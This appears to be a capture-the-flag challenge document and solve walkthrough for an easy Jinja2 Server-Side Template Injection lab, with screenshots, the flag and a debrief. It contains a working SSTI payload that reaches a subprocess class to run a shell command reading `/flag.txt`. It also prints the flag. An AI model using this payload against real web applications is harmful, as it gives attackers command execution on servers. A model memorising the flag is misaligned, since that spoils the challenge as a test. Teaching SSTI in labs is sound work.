# Challenge Document


### Version: `0.1.0`
### Long Title: Anime Quotes
### Short Title: WEB01
### Author: V37R1X
### Date: 02/08/2025
### Difficulty: Easy
### Learning objective: Learn to identify and exploit Server-Side Template Injection (SSTI) vulnerabilities in Jinja2


## Challenge Brief (as its to be written in RIO):

Navigate to this [website](LINK_HERE) and collect the flag stored in `/flag.txt`! 
Good luck! 

## Solve:

- Navigate to the website/Public IP. 

<img width="946" height="746" alt="image" src="https://github.com/user-attachments/assets/cddf1422-4a8c-40a8-80d4-c4ec2c8c4e02" />


- Inject the SSTI Payload in the `username` parameter to test if its vulnerable to Jinja2 SSTI.

```py
{7*7}
```

<img width="1083" height="1058" alt="image" src="https://github.com/user-attachments/assets/b6ec16c2-8fba-4e7b-a596-83480aafa976" />


- From here we can narrow down the SSTI Payload and create a payload to get the flag:

<img width="938" height="691" alt="image" src="https://github.com/user-attachments/assets/2c962804-d8d5-4b61-9532-47af2c368876" />

```py
{ 'x'.__class__.__base__.__subclasses__()[356]('cat ../flag.txt', shell=True, stdout=-1).communicate()[0] }
```

<img width="1811" height="965" alt="image" src="https://github.com/user-attachments/assets/c14a9a33-3a7b-48d1-9361-ea3f34d106e3" />


- This gets the flag:

```
FLAG{Serv3r_S1d3_T3mpl4t3_Inj3cti0n_SuP3rMaCy!}
```

## Author Notes: 

Keep Refreshing for a new Quote!


## Debrief: 

This challenge involves exploiting SSTI vulnerabilities in a Flask application which is using Jinja2 as its templating engine. The application has a custom filter (`eval_filter`) which unsafely evaluates the users input, allowing execution of code. By submitting a payload through `username` parameter you can test for the SSTI vulnerability and escalate it to read the flag of `/flag.txt` 

## Hints: 

1. What happens when you submit `{7*7}` as the username - does the result hint at a way hidden files like `/flag.txt`?
